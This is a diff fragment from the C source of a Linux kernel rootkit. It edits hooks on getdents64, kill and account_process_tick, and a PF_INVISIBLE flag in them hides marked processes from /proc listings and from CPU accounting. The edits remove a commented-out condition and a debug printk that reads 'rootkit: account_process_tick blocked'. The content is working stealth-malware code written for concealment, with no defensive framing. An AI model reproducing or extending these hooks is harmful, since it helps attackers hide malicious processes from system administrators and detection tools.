@@ -142,8 +142,7 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 #else
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		proc = 1;
 
 	while (off < ret) {
@@ -281,8 +280,7 @@ hacked_kill(pid_t pid, int sig)
 KHOOK(account_process_tick);
 static void khook_account_process_tick(struct task_struct *tsk, int user)
 {
-	if (tsk->flags & PF_INVISIBLE) {
-		// printk(KERN_INFO "rootkit: account_process_tick blocked >:-)\n");
+    if (tsk->flags & PF_INVISIBLE) {
         return;
     }
     return KHOOK_ORIGIN(account_process_tick, tsk, user);
